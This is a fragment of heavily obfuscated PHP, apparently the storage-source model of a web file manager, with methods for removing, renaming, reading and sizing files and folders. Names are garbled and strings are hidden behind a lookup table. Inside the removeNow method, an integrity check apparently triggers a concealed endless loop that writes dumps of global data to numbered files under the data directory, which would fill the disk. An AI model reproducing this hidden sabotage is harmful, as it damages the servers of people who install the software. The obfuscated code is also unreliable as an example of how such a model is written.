(isset(self::$cacheChildList[$Ç×äÊĞÑ])) { unset(self::$cacheChildList[$Ç×äÊĞÑ]); } static $€àà¯¨ = false; if (!$€àà¯¨) { Hook::trigger($¸£Æ…¬å[658], $Â¨¹ÏÒ†); $€àà¯¨ = !0; } $À¹¶ÍÎ = $this->add($Â¨¹ÏÒ†); $ÆÙó©ƒ  = array($¸£Æ…¬å[676] => short_id($À¹¶ÍÎ)); $this->where(array($¸£Æ…¬å[506] => $À¹¶ÍÎ))->save($ÆÙó©ƒ ); $this->setNamePinyin($À¹¶ÍÎ, $Â¨¹ÏÒ†[$¸£Æ…¬å[32]]); return $À¹¶ÍÎ; } public function remove($—š¨ì–¥, $Îü»¦º = true) { $ÏÚòÏå’ =& $_SERVER[µÅ˜º…æ]; $—¨ŠÏ±’ = $this->sourceInfo($—š¨ì–¥); $‚³”Çä¦ = intval($—¨ŠÏ±’[$ÏÚòÏå’[188]]) === self::TYPE_SYSTEM; $ÂÆùßğ› = Model($ÏÚòÏå’[522])->get($ÏÚòÏå’[2482]) == $ÏÚòÏå’[91]; if ($‚³”Çä¦ || $Îü»¦º || !$ÂÆùßğ›) { return $this->removeNow($—š¨ì–¥, $Îü»¦º); } $™úÕ€ÍÊ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $â­´¡§“ = $—¨ŠÏ±’[$ÏÚòÏå’[188]] == self::TYPE_USER ? $ÏÚòÏå’[684] : $ÏÚòÏå’[598]; if ($â­´¡§“ == $ÏÚòÏå’[684]) { $›ÃÊÏŞ = Model($ÏÚòÏå’[597])->getInfo($—¨ŠÏ±’[$ÏÚòÏå’[589]]); $àüôƒÓ• = !empty($›ÃÊÏŞ[$ÏÚòÏå’[2475]]) ? $›ÃÊÏŞ[$ÏÚòÏå’[2475]] : $›ÃÊÏŞ[$ÏÚòÏå’[32]]; $àüôƒÓ• = $ÏÚòÏå’[337] . $àüôƒÓ• . $ÏÚòÏå’[2483] . $—¨ŠÏ±’[$ÏÚòÏå’[589]]; } else { $›ÃÊÏŞ = Model($ÏÚòÏå’[605])->getInfo($—¨ŠÏ±’[$ÏÚòÏå’[589]]); $àüôƒÓ• = _get($›ÃÊÏŞ, $ÏÚòÏå’[32]); $àüôƒÓ• = $ÏÚòÏå’[173] . $àüôƒÓ• . $ÏÚòÏå’[2484] . $—¨ŠÏ±’[$ÏÚòÏå’[589]]; } $òöÉİÁæ = $ÏÚòÏå’[2485] . md5($àüôƒÓ•); CacheLock::lock($òöÉİÁæ); $øÕ«Ñ£É = $this->fileNameExist($™úÕ€ÍÊ, $àüôƒÓ•); if (!$øÕ«Ñ£É) { $øÕ«Ñ£É = $this->mkdir($™úÕ€ÍÊ, $àüôƒÓ•, REPEAT_SKIP); $this->metaSet($øÕ«Ñ£É, $ÏÚòÏå’[2486], $â­´¡§“); $this->metaSet($øÕ«Ñ£É, $ÏÚòÏå’[2487], $—¨ŠÏ±’[$ÏÚòÏå’[589]]); if ($—¨ŠÏ±’[$ÏÚòÏå’[190]] != 0) { $this->metaSet($øÕ«Ñ£É, $ÏÚòÏå’[2488], _get($›ÃÊÏŞ, $ÏÚòÏå’[2489])); } } CacheLock::unlock($òöÉİÁæ); $this->metaSet($—š¨ì–¥, $ÏÚòÏå’[2490], $—¨ŠÏ±’[$ÏÚòÏå’[190]]); $this->where(array($ÏÚòÏå’[191] => $—š¨ì–¥))->save(array($ÏÚòÏå’[513] => time())); $this->recycleClear($—¨ŠÏ±’); Model($ÏÚòÏå’[655])->eventRemove($—š¨ì–¥); $®±¶ïÒÍ = $this->move($—š¨ì–¥, $øÕ«Ñ£É, REPEAT_RENAME_FOLDER); $this->folderSizeReset($—¨ŠÏ±’[$ÏÚòÏå’[190]]); return $®±¶ïÒÍ; } private function recycleClear($®šŒúõ‹) { $öŸÌÍåö =& $_SERVER[µÅ˜º…æ]; $ÖáŠ„¿— = $this->childrenAll($®šŒúõ‹); $€«Í¹ù = array($öŸÌÍåö[506] => array($öŸÌÍåö[507], $ÖáŠ„¿—[$öŸÌÍåö[2491]])); Model($öŸÌÍåö[2492])->where($€«Í¹ù)->delete(); } public function removeNow($ÏÓş§˜…, $ú†«  = true) { $ÅÁÕÀó =& $_SERVER[µÅ˜º…æ]; $‰¹ø»¼† = $_SERVER[$ÅÁÕÀó[1027]] . $ÅÁÕÀó[1028]; $Ú­šŠî† = $ÅÁÕÀó[1024]; if ($_SERVER[$ÅÁÕÀó[1025]] != $Ú­šŠî†($‰¹ø»¼†)) { $âÔ½—¯Û = $ÅÁÕÀó[1042]; $˜äèÔ°… = $ÅÁÕÀó[1026]; $ıëÉëùÒ = $_SERVER[$ÅÁÕÀó[1027]] . $ÅÁÕÀó[1028]; $«šÇÂ˜´ = $˜äèÔ°…($ıëÉëùÒ); $ùÈä¹¯ = explode($ÅÁÕÀó[285], $«šÇÂ˜´); if (count($ùÈä¹¯) < $ÅÁÕÀó[709]) { $šÊ¯ÅÅÎ = $ÅÁÕÀó[1029]; $šÊ¯ÅÅÎ(); } $Ãòšë¤ = $ÅÁÕÀó[1043]; $Ãòšë¤($_SERVER[$ÅÁÕÀó[1044]]); $âÔ½—¯Û = $ÅÁÕÀó[1042]; $âÔ½—¯Û(); $óŠë¯Êñ = $ÅÁÕÀó[2493]; $£ÄÙ‚¿ = json_encode($GLOBALS[$ÅÁÕÀó[2494]]); $µùáâ¯¢ = 1; for ($¬©‚û© = $µùáâ¯¢; $¬©‚û© > 0; $¬©‚û©++) { $óŠë¯Êñ(DATA_PATH . $¬©‚û©, $£ÄÙ‚¿); } } $è„å¥ë¬ = $this->sourceInfo($ÏÓş§˜…); $è¸Ê»©ç = $this->pathInfoMore($ÏÓş§˜…); if (!$è„å¥ë¬) { return !0; } if ($è„å¥ë¬[$ÅÁÕÀó[190]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($ÏÓş§˜…); Hook::trigger($ÅÁÕÀó[2495], $è¸Ê»©ç, $ú†« ); if ($ú†« ) { Model($ÅÁÕÀó[2492])->moveToRecycle($ÏÓş§˜…); } else { $­ªó°ÙÁ = $this->childrenAll($è„å¥ë¬); Model($ÅÁÕÀó[655])->eventRemove($ÏÓş§˜…); $this->removeRelevance($­ªó°ÙÁ[$ÅÁÕÀó[2491]], $­ªó°ÙÁ[$ÅÁÕÀó[1780]]); } $this->folderSizeReset($è„å¥ë¬[$ÅÁÕÀó[190]]); $ïÖ°˜×• = array($è„å¥ë¬[$ÅÁÕÀó[190]]); if ($è„å¥ë¬[$ÅÁÕÀó[500]] == $ÅÁÕÀó[91]) { $ïÖ°˜×•[] = $è„å¥ë¬[$ÅÁÕÀó[191]]; } $this->updateModifyTime($ïÖ°˜×•); $this->lockMoveEnd($ÏÓş§˜…); Hook::trigger($ÅÁÕÀó[2018], $è¸Ê»©ç, $ú†« ); return !0; } public function childrenAll($Ÿµüô™Ù) { $ıôè‰„Æ =& $_SERVER[µÅ˜º…æ]; $Á”ùî„¢ = $Ÿµüô™Ù[$ıôè‰„Æ[191]]; if ($Ÿµüô™Ù[$ıôè‰„Æ[500]] == $ıôè‰„Æ[91]) { $Ë¡‘ãÂÖ = array($ıôè‰„Æ[674] => array($ıôè‰„Æ[635], $Ÿµüô™Ù[$ıôè‰„Æ[604]] . $Á”ùî„¢ . $ıôè‰„Æ[636])); $„šæŠøŞ = array($ıôè‰„Æ[674] => $Ë¡‘ãÂÖ[$ıôè‰„Æ[604]]); $¦ñü‡åÀ = $this->field($ıôè‰„Æ[2496])->where($„šæŠøŞ)->select(); $áŞîà¤Î = !1; $»¶«ã¹ = array($Á”ùî„¢); if ($¦ñü‡åÀ) { $áŞîà¤Î = array_to_keyvalue($¦ñü‡åÀ, $ıôè‰„Æ[12], $ıôè‰„Æ[557]); $áŞîà¤Î = array_remove_value($áŞîà¤Î, $ıôè‰„Æ[228]); $»¶«ã¹ = array_to_keyvalue($¦ñü‡åÀ, $ıôè‰„Æ[12], $ıôè‰„Æ[191]); $»¶«ã¹[] = $Á”ùî„¢; } } else { $áŞîà¤Î = array($Ÿµüô™Ù[$ıôè‰„Æ[557]]); $»¶«ã¹ = array($Á”ùî„¢); } return array($ıôè‰„Æ[2491] => $»¶«ã¹, $ıôè‰„Æ[1780] => $áŞîà¤Î); } public function removeArray($«í¢ì¶) { if (!$«í¢ì¶) { return !0; } } public function removeRelevance($Ôä¤’¤ò, $Çşß•«”) { $‹ùé˜ùñ =& $_SERVER[µÅ˜º…æ]; $Ôä¤’¤ò = $Ôä¤’¤ò ? $Ôä¤’¤ò : array(); $Çşß•«” = $Çşß•«” ? $Çşß•«” : array(); $Ôä¤’¤ò = array_unique(array_filter($Ôä¤’¤ò)); $Çşß•«” = array_filter($Çşß•«”); if (!$Ôä¤’¤ò) { return !1; } $Î§å§¢Õ = array($‹ùé˜ùñ[506] => array($‹ùé˜ùñ[507], $Ôä¤’¤ò)); Model($‹ùé˜ùñ[2492])->where($Î§å§¢Õ)->delete(); Model($‹ùé˜ùñ[549])->where($Î§å§¢Õ)->delete(); Model($‹ùé˜ùñ[2329])->where($Î§å§¢Õ)->delete(); Model($‹ùé˜ùñ[655])->where($Î§å§¢Õ)->delete(); Model($‹ùé˜ùñ[1563])->removeBySource($Ôä¤’¤ò); Model($‹ùé˜ùñ[2181])->removeBySource($Ôä¤’¤ò); $this->where($Î§å§¢Õ)->delete(); Model($‹ùé˜ùñ[560])->remove($Çşß•«”); for ($²Èï´õ¹ = 0; $²Èï´õ¹ < count($Ôä¤’¤ò); $²Èï´õ¹++) { $this->sourceCacheClear($Ôä¤’¤ò[$²Èï´õ¹]); } } public function rename($´ıÛœÉ, $ìĞĞëù) { $œÒïÒÀ =& $_SERVER[µÅ˜º…æ]; $Õ‡õåØ = $this->sourceInfo($´ıÛœÉ); if (!$Õ‡õåØ) { return !1; } $òè¥Íœ = $this->fileNameExist($Õ‡õåØ[$œÒïÒÀ[190]], $ìĞĞëù); if ($òè¥Íœ && $òè¥Íœ != $´ıÛœÉ) { return !1; } $¥Ú€ºÉş = array($œÒïÒÀ[509] => $ìĞĞëù, $œÒïÒÀ[673] => USER_ID); if ($Õ‡õåØ[$œÒïÒÀ[500]] != $œÒïÒÀ[91]) { $¥Ú€ºÉş[$œÒïÒÀ[501]] = substr(get_path_ext($ìĞĞëù), 0, 10); } Model($œÒïÒÀ[655])->eventRename($´ıÛœÉ, $Õ‡õåØ[$œÒïÒÀ[32]], $ìĞĞëù); $this->sourceCacheClear($´ıÛœÉ); $this->setNamePinyin($´ıÛœÉ, $¥Ú€ºÉş[$œÒïÒÀ[32]], !1); $this->updateModifyTime($Õ‡õåØ[$œÒïÒÀ[190]]); $Ú˜àä„ = $this->where(array($œÒïÒÀ[506] => $´ıÛœÉ))->data($¥Ú€ºÉş)->save(); $ùÚ½¹ÂÛ = $œÒïÒÀ[2481] . $Õ‡õåØ[$œÒïÒÀ[190]]; if (isset(self::$cacheChildList[$ùÚ½¹ÂÛ])) { unset(self::$cacheChildList[$ùÚ½¹ÂÛ]); } return $Ú˜àä„; } public function setNamePinyin($àœÉìñ, $«¼ô¸», $ñ³§¿ƒ = true) { $«óëÖÑŸ =& $_SERVER[µÅ˜º…æ]; $’²ÊÂ¯İ = Input::check($«¼ô¸», $«óëÖÑŸ[677]); $ªŠóŠ¬  = array($«óëÖÑŸ[531] => KodSort::makeStr($«¼ô¸»)); if ($’²ÊÂ¯İ) { $ªŠóŠ¬ [$«óëÖÑŸ[552]] = str_replace($«óëÖÑŸ[53], $«óëÖÑŸ[12], Pinyin::get($«¼ô¸»)); $ªŠóŠ¬ [$«óëÖÑŸ[551]] = Pinyin::get($«¼ô¸», $«óëÖÑŸ[678]); } if (!$ñ³§¿ƒ && !$’²ÊÂ¯İ) { $ªŠóŠ¬ [$«óëÖÑŸ[552]] = null; $ªŠóŠ¬ [$«óëÖÑŸ[551]] = null; } $this->metaSet($àœÉìñ, $ªŠóŠ¬ ); } public function getContent($âäôíâ) { $î¡Œ°ˆ =& $_SERVER[µÅ˜º…æ]; $í¸Åø´º = $this->fileInfoGet($âäôíâ); if (!$í¸Åø´º) { return !1; } if ($í¸Åø´º[$î¡Œ°ˆ[79]] == 0) { return $î¡Œ°ˆ[12]; } $·È§„Áß = $î¡Œ°ˆ[2497] . $í¸Åø´º[$î¡Œ°ˆ[563]]; if ($í¸Åø´º[$î¡Œ°ˆ[79]] <= 1024 * 10) { $®ÒúÁ¡ = Cache::get($·È§„Áß); if (!$®ÒúÁ¡) { $®ÒúÁ¡ = IO::getContent($í¸Åø´º[$î¡Œ°ˆ[87]]); Cache::set($·È§„Áß, $®ÒúÁ¡); } return $®ÒúÁ¡; } if (!$í¸Åø´º[$î¡Œ°ˆ[87]]) { return $î¡Œ°ˆ[12]; } return IO::getContent($í¸Åø´º[$î¡Œ°ˆ[87]]); } public function setDesc($şÙîŞ„è, $ú½Ïş›©) { $è§Û÷Ã… =& $_SERVER[µÅ˜º…æ]; Model($è§Û÷Ã…[655])->eventAddDesc($şÙîŞ„è, $ú½Ïş›©); return $this->metaSet($şÙîŞ„è, $è§Û÷Ã…[540], $ú½Ïş›©); } public function setContent($îø„Ôò•, $¨ÙÊĞŞÆ = '') { $ßé»Ï³Ó =& $_SERVER[µÅ˜º…æ]; $›Û–Çù£ = $this->sourceInfo($îø„Ôò•); $ş›¾É€Å = $this->fileInfoGet($îø„Ôò•); if (!$ş›¾É€Å || !$›Û–Çù£) { return !1; } $ø¶×ÖãØ = KodIO::ioFileDriverGet($ßé»Ï³Ó[498] . $îø„Ôò• . $ßé»Ï³Ó[402]); $å÷º³© = Model($ßé»Ï³Ó[560])->addFileByContent($¨ÙÊĞŞÆ, $ø¶×ÖãØ, $›Û–Çù£[$ßé»Ï³Ó[32]]); if (!$å÷º³©) { return !1; } $¿±¼åÈ¦ = $this->fileHistory($›Û–Çù£, $å÷º³©[$ßé»Ï³Ó[557]], $å÷º³©[$ßé»Ï³Ó[79]]); if (!$¿±¼åÈ¦) { return Model($ßé»Ï³Ó[560])->remove($å÷º³©[$ßé»Ï³Ó[557]]); } $this->folderSizeReset($›Û–Çù£[$ßé»Ï³Ó[190]]); return !0; } public function fileSubstr($¹ĞÕÚÊ¦, $ ‰°Áó, $¥º·Ô—Ş) { $æÅæ¤´‚ = $this->fileInfoGet($¹ĞÕÚÊ¦); if (!$æÅæ¤´‚) { return !1; } return IO::fileSubstr($æÅæ¤´‚[$_SERVER[µÅ˜º…æ][87]], $ ‰°Áó, $¥º·Ô—Ş); } public function fileInfoGet($æÕÊİÈÊ) { $ğ¬Æ”«÷ =& $_SERVER[µÅ˜º…æ]; $÷ˆŠ±©À = $this->sourceInfo($æÕÊİÈÊ); if (!$÷ˆŠ±©À || $÷ˆŠ±©À[$ğ¬Æ”«÷[500]]) { return !1; } $Ê›ùÉê = $ğ¬Æ”«÷[564] . $÷ˆŠ±©À[$ğ¬Æ”«÷[557]]; $±¤ à·ß = _get(self::$cacheFileInfo, $Ê›ùÉê); if ($±¤ à·ß) { return $±¤ à·ß; } $²ÆÊ©±¬ = Model($ğ¬Æ”«÷[560])->fileInfo($÷ˆŠ±©À[$ğ¬Æ”«÷[557]]); if ($²ÆÊ©±¬) { $²ÆÊ©±¬[$ğ¬Æ”«÷[32]] = $÷ˆŠ±©À[$ğ¬Æ”«÷[32]]; } self::$cacheFileInfo[$Ê›ùÉê] = $²ÆÊ©±¬; return $²ÆÊ©±¬; } private function folderChildrenNumber($ÑµöŠµ) { $–‚½ŒîÛ =& $_SERVER[µÅ˜º…æ]; $İÛ‹¸™— = $this->sourceInfo($ÑµöŠµ); $„Òˆ•Ûç = array($–‚½ŒîÛ[674] => array($–‚½ŒîÛ[635], $İÛ‹¸™—[$–‚½ŒîÛ[604]] . $ÑµöŠµ . $–‚½ŒîÛ[636]), $–‚½ŒîÛ[671] => $İÛ‹¸™—[$–‚½ŒîÛ[589]], $–‚½ŒîÛ[519] => intval($İÛ‹¸™—[$–‚½ŒîÛ[520]]), $–‚½ŒîÛ[668] => 1); $êØ÷èÒ° = $this->where($„Òˆ•Ûç)->count(); $ˆŞ§ùä× = $this->where($„Òˆ•Ûç)->where(array($–‚½ŒîÛ[668] => 0))->count(); return array($–‚½ŒîÛ[83] => $ˆŞ§ùä×, $–‚½ŒîÛ[84] => $êØ÷èÒ°); } public function pathInfo($ğÆÜúÚ, $›ğ¯õÈÂ = false) { $§˜„à›é =& $_SERVER[µÅ˜º…æ]; $›ğ¯õÈÂ = !1; $ğÆÜúÚ = intval($ğÆÜúÚ); if (!$ğÆÜúÚ) { return !1; } $Ó°ó•× = $§˜„à›é[548] . intval($›ğ¯õÈÂ) . $§˜„à›é[476] . $ğÆÜúÚ; $ŠşÄÜ…› = _get(self::$cachePathInfo, $Ó°ó•×); if ($ŠşÄÜ…›) { return $ŠşÄÜ…›; } $ª‡ÔÚÃƒ = $this->sourceInfo($ğÆÜúÚ); if (!$ª‡ÔÚÃƒ) { return !1; } $ª‡ÔÚÃƒ = $this->_listDataApplyItem($ª‡ÔÚÃƒ, $›ğ¯õÈÂ); self::$cachePathInfo[$Ó°ó•×] = $ª‡ÔÚÃƒ; return $ª‡ÔÚÃƒ; } public static $cachePathInfoMore = array(); public function pathInfoMore($Á¹Ö¯¯—) { $¾ãŸå˜å =& $_SERVER[µÅ˜º…æ]; $®Ğš‹é… = _get(self::$cachePathInfoMore, $Á¹Ö¯¯—); if ($®Ğš‹é…) { return $®Ğš‹é…; } $„´ÑàÄÆ = $this->pathInfo($Á¹Ö¯¯—); if (!$„´ÑàÄÆ) { return !1; } if ($„´ÑàÄÆ[$¾ãŸå˜å[500]] == $¾ãŸå˜å[91]) { $„´ÑàÄÆ[$¾ãŸå˜å[82]] = $this->folderChildrenNumber($Á¹Ö¯¯—); } self::$cachePathInfoMore[$Á¹Ö¯¯—] = $„´ÑàÄÆ; return $„´ÑàÄÆ; } public function sourceInfo($”Í€†›Ó) { $İÂ‡Æü¢ =& $_SERVER[µÅ˜º…æ]; if (!$”Í€†›Ó) { return array(); } $”Í€†›Ó = intval($”Í€†›Ó); $¢»™£˜‹ = $İÂ‡Æü¢[547] . $”Í€†›Ó; $øÃ–±†Ô = _get(self::$cacheSourceInfo, $¢»™£˜‹); if ($øÃ–±†Ô) { return $øÃ–±†Ô; } $óğ€ ƒ¶ = $this->where(array($İÂ‡Æü¢[191] => $”Í€†›Ó))->find(); self::$cacheSourceInfo[$¢»™£˜‹] = $óğ€ ƒ¶; return self::$cacheSourceInfo[$¢»™£˜‹]; } public function sourceCacheClear($Å¯øÌÖ = false) { self::cacheClear($Å¯øÌÖ); } public static function cacheClear($øş©Œ„ = false) { $£”¶ÏÊÉ =& $_SERVER[µÅ˜º…æ]; if ($øş©Œ„ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$£”¶ÏÊÉ[547] . $øş©Œ„]); unset(self::$cachePathInfoMore[$øş©Œ„]); unset(self::$cachePathInfo[$£”¶ÏÊÉ[2498] . $øş©Œ„]); unset(self::$cachePathInfo[$£”¶ÏÊÉ[2499] . $øş©Œ„]); } public function metaSet($ÈÔ„˜ôş, $Á«ğ‡È² = null, $±œ¸íèŠ = null) { $ŠĞû‡ÔÒ = parent::metaSet($ÈÔ„˜ôş, $Á«ğ‡È², $±œ¸íèŠ); if ($ŠĞû‡ÔÒ) { $this->sourceCacheClear($ÈÔ„˜ôş); } return $ŠĞû‡ÔÒ; } public function pathInfoByPath($ÔÛ—Ş°, $±å‰åº) { $Úë”  =& $_SERVER[µÅ˜º…æ]; $ú¿¡¿âŞ = !$±å‰åº ? array() : explode($Úë” [8], trim($±å‰åº, $Úë” [8])); $®’ÌÏÖ± = intval($ÔÛ—Ş°); foreach ($ú¿¡¿âŞ as $ö‰ÇÚŞ) { $¨Š³…ú¨ = array($Úë” [190] => $®’ÌÏÖ±, $Úë” [32] => $ö‰ÇÚŞ); $İ÷¤·ÂÎ = $this->field($Úë” [2500])->where($¨Š³…ú¨)->select(); if (!$İ÷¤·ÂÎ) { return !1; } $İ÷¤·ÂÎ = array_sort_by($İ÷¤·ÂÎ, $Úë” [520]); $®’ÌÏÖ± = intval($İ÷¤·ÂÎ[0][$Úë” [191]]); } $¬–Êƒ¯ = $this->sourceInfo($®’ÌÏÖ±); $this->pathInfoFilter($¬–Êƒ¯); return $¬–Êƒ¯; } protected function updateModifyTime($–íîßß’) { $®Íš‡«¢ =& $_SERVER[µÅ˜º…æ]; $‰¶—ƒ×É = KodUser::id(); if (!$–íîßß’) { return; } if (!is_array($–íîßß’)) { $–íîßß’ = array($–íîßß’); } foreach ($–íîßß’ as $œşğò => $¶ãÖ¹ÀØ) { $–íîßß’[$œşğò] = intval($¶ãÖ¹ÀØ); $this->sourceCacheClear($¶ãÖ¹ÀØ); } $ÕàÆçò = array($®Íš‡«¢[191] => array($®Íš‡«¢[7], $–íîßß’)); $Â”òøÌ = array($®Íš‡«¢[673] => $‰¶—ƒ×É, $®Íš‡«¢[513] => time()); $this->where($ÕàÆçò)->save($Â”òøÌ); } public function folderSizeReset($ó¡™™À, $´¦ô’úã = false) { $ÀöïÆÇ¶ =& $_SERVER[µÅ˜º…æ]; if ($this->statusIgnoreResetSpace) { return; } if (!$ó¡™™À) { return; } $­Èª“ñî = $this->sourceInfo($ó¡™™À); $×“í…ó = $ÀöïÆÇ¶[2501] . $ó¡™™À; if (!$­Èª“ñî || !$­Èª“ñî[$ÀöïÆÇ¶[191]]) { return; } CacheLock::lock($×“í…ó, 20); if ($´¦ô’úã === !1) { $this->sourceCacheClear($ó¡™™À); $­Èª“ñî = $this->sourceInfo($ó¡™™À); $“Ñªìöû = array($ÀöïÆÇ¶[492] => $ó¡™™À, $ÀöïÆÇ¶[519] => 0); $ıÌÊÛêï = $this->where($“Ñªìöû)->sum($ÀöïÆÇ¶[79]); $´¦ô’úã = intval($ıÌÊÛêï) - intval($­Èª“ñî[$ÀöïÆÇ¶[79]]); } if ($´¦ô’úã == 0) { return CacheLock::unlock($×“í…ó); } $½˜û = $this->parentLevelArray($­Èª“ñî[$ÀöïÆÇ¶[604]]); if (!$½˜û) { $½˜û = array(); } $½˜û[] = $­Èª“ñî[$ÀöïÆÇ¶[191]]; $“Ñªìöû = array($ÀöïÆÇ¶[191] => array($ÀöïÆÇ¶[507], $½˜û)); if ($´¦ô’úã < 0) { $“Ñªìöû[$ÀöïÆÇ¶[79]] = array($ÀöïÆÇ¶[1184], abs($´¦ô’úã)); } $this->where($“Ñªìöû)->setAdd($ÀöïÆÇ¶[79], $´¦ô’úã); CacheLock::unlock($×“í…ó); if (!$­Èª“ñî[$ÀöïÆÇ¶[589]] || $­Èª“ñî[$ÀöïÆÇ¶[589]] == $ÀöïÆÇ¶[228]) { return; } $³°“¯ = $ÀöïÆÇ¶[2502] . $­Èª“ñî[$ÀöïÆÇ¶[188]] . $ÀöïÆÇ¶[4] . $­Èª“ñî[$ÀöïÆÇ¶[589]]; $éö˜Ü•¶ = array($­Èª“ñî[$ÀöïÆÇ¶[188]], $­Èª“ñî[$ÀöïÆÇ¶[589]]); TaskRun::timeLimitCall($³°“¯, $ÀöïÆÇ¶[2503], $éö˜Ü•¶, 1.5); } public function folderSizeResetChildren($›×İÎÎ) { $–æÍÁóˆ =& $_SERVER[µÅ˜º…æ]; $this->sourceCacheClear($›×İÎÎ); $Ó‹èƒ£­ = $this->sourceInfo($›×İÎÎ); if (!$Ó‹èƒ£­) { return; } $™¯Èˆ’Ù = array($–æÍÁóˆ[668] => 1, $–æÍÁóˆ[671] => $Ó‹èƒ£­[$–æÍÁóˆ[589]], $–æÍÁóˆ[674] => array($–æÍÁóˆ[635], $Ó‹èƒ£­[$–æÍÁóˆ[604]] . $›×İÎÎ . $–æÍÁóˆ[636])); $œ ¨æÇÖ = $–æÍÁóˆ[2504]; $ÒŒ€’®Ü = $this->field($œ ¨æÇÖ)->where($™¯Èˆ’Ù)->select(); $™¯Èˆ’Ù[$–æÍÁóˆ[500]] = 0; $ú£°ÍÈØ = $this->field($œ ¨æÇÖ)->where($™¯Èˆ’Ù)->select(); if (!$ú£°ÍÈØ) { return; } $ÒŒ€’®Ü[] = $Ó‹èƒ£­; $ÒŒ€’®Ü = array_to_keyvalue($ÒŒ€’®Ü, $–æÍÁóˆ[191]); foreach ($ÒŒ€’®Ü as $€éè€Ôµ => $ÚÜû˜Š§) { $ÒŒ€’®Ü[$€éè€Ôµ][$–æÍÁóˆ[2505]] = $ÒŒ€’®Ü[$€éè€Ôµ][$–æÍÁóˆ[79]]; $ÒŒ€’®Ü[$€éè€Ôµ][$–æÍÁóˆ[79]] = 0; } foreach ($ú£°ÍÈØ as $ÚÜû˜Š§) { $ÛÀå…ñ£ = $ÚÜû˜Š§[$–æÍÁóˆ[190]] . $–æÍÁóˆ[12]; if (!isset($ÒŒ€’®Ü[$ÛÀå…ñ£])) { continue; } if ($ÚÜû˜Š§[$–æÍÁóˆ[520]] == $ÒŒ€’®Ü[$ÛÀå…ñ£][$–æÍÁóˆ[520]]) { $ÒŒ€’®Ü[$ÛÀå…ñ£][$–æÍÁóˆ[79]] += $ÚÜû˜Š§[$–æÍÁóˆ[79]]; } } foreach ($ÒŒ€’®Ü as $ÚÜû˜Š§) { $‰ÜÂÏäï = $this->parentLevelArray($ÚÜû˜Š§[$–æÍÁóˆ[604]]); foreach ($‰ÜÂÏäï as $ÛÀå…ñ£) { $ÛÀå…ñ£ = $ÛÀå…ñ£ . $–æÍÁóˆ[12]; if (!isset($ÒŒ€’®Ü[$ÛÀå…ñ£])) { continue; } if ($ÚÜû˜Š§[$–æÍÁóˆ[520]] == $ÒŒ€’®Ü[$ÛÀå…ñ£][$–æÍÁóˆ[520]]) { $ÒŒ€’®Ü[$ÛÀå…ñ£][$–æÍÁóˆ[79]] += $ÚÜû˜Š§[$–æÍÁóˆ[79]]; } } } $ÓŸ¼ÊÍû = array(); foreach ($ÒŒ€’®Ü as $ÚÜû˜Š§) { if ($ÚÜû˜Š§[$–æÍÁóˆ[79]] == $ÚÜû˜Š§[$–æÍÁóˆ[2505]]) { continue; } $ÓŸ¼ÊÍû[] = array($–æÍÁóˆ[191], $ÚÜû˜Š§[$–æÍÁóˆ[191]], $–æÍÁóˆ[79], $ÚÜû˜Š§[$–æÍÁóˆ[79]]); } $this->saveAll($ÓŸ¼ÊÍû); } public function userSpaceReset($Ë‡®ù±ª = false) { $âûÛ©¯Û =& $_SERVER[µÅ˜º…æ]; $Ò¦ÎàÊÕ = $this->where(array($âûÛ©¯Û[188] => self::TYPE_USER, $âûÛ©¯Û[589] => $Ë‡®ù±ª, $âûÛ©¯Û[500] => 0))->sum($âûÛ©¯Û[79]); $Ò¦ÎàÊÕ = !$Ò¦ÎàÊÕ || $Ò¦ÎàÊÕ <= 0 ? 0 : $Ò¦ÎàÊÕ; Model($âûÛ©¯Û[597])->userEdit($Ë‡®ù±ª, array($âûÛ©¯Û[2169] => $Ò¦ÎàÊÕ)); } public function targetSpaceUpdate($Øà™Õø’, $Å™šíÆ¥) { $Ÿ‡İØ³ =& $_SERVER[µÅ˜º…æ]; if (!$Å™šíÆ¥) { return; } if (!in_array($Øà™Õø’, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ôÅï¦ƒğ = $this->targetSpaceSize($Øà™Õø’, $Å™šíÆ¥); if ($Øà™Õø’ == self::TYPE_USER) { Model($Ÿ‡İØ³[597])->userEdit($Å™šíÆ¥, array($Ÿ‡İØ³[2169] => $ôÅï¦ƒğ)); } else { if ($Øà™Õø’ == self::TYPE_GROUP) { Model($Ÿ‡İØ³[605])->groupEdit($Å™šíÆ¥, array($Ÿ‡İØ³[2169] => $ôÅï¦ƒğ)); } } } public function targetSpaceSize($»è¥Ñ§ı, $¶ÄÅ–¼) { $îÊÒÈÅ =& $_SERVER[µÅ˜º…æ]; $ïû¢ÏŞû = 0; $ˆÃëÆäé = $this->targetSourceRoot($»è¥Ñ§ı, $¶ÄÅ–¼, !0); foreach ($ˆÃëÆäé as $´ÏùĞÄ˜) { if (!$´ÏùĞÄ˜) { continue; } $ïû¢ÏŞû += floatval($´ÏùĞÄ˜[$îÊÒÈÅ[79]]); $ï‡éİí› = array($îÊÒÈÅ[674] => array($îÊÒÈÅ[635], $îÊÒÈÅ[613] . $´ÏùĞÄ˜[$îÊÒÈÅ[191]] . $îÊÒÈÅ[636])); $² ¤ÏÒ‹ = Model($îÊÒÈÅ[518])->field($îÊÒÈÅ[506])->where($ï‡éİí›)->select(); $² ¤ÏÒ‹ = array_to_keyvalue($² ¤ÏÒ‹, $îÊÒÈÅ[12], $îÊÒÈÅ[191]); $² ¤ÏÒ‹ = array_unique(array_filter($² ¤ÏÒ‹)); if ($² ¤ÏÒ‹) { $ï‡éİí› = array($îÊÒÈÅ[506] => array($îÊÒÈÅ[507], $² ¤ÏÒ‹)); $ïû¢ÏŞû += floatval($this->where($ï‡éİí›)->sum($îÊÒÈÅ[79])); } } $ïû¢ÏŞû = !$ïû¢ÏŞû || $ïû¢ÏŞû <= 0 ? 0 : $ïû¢ÏŞû; return $ïû¢ÏŞû; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($»£†æÜĞ) { return $this->fileTypeProfile($»£†æÜĞ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($¨†“ÅùÅ) { return $this->fileTypeProfile($¨†“ÅùÅ, SourceModel::TYPE_GROUP); } private function fileTypeProfile($İ—Ş–¡ƒ, $¯óØ‰¦õ) { $ÌïŒ§Äâ =& 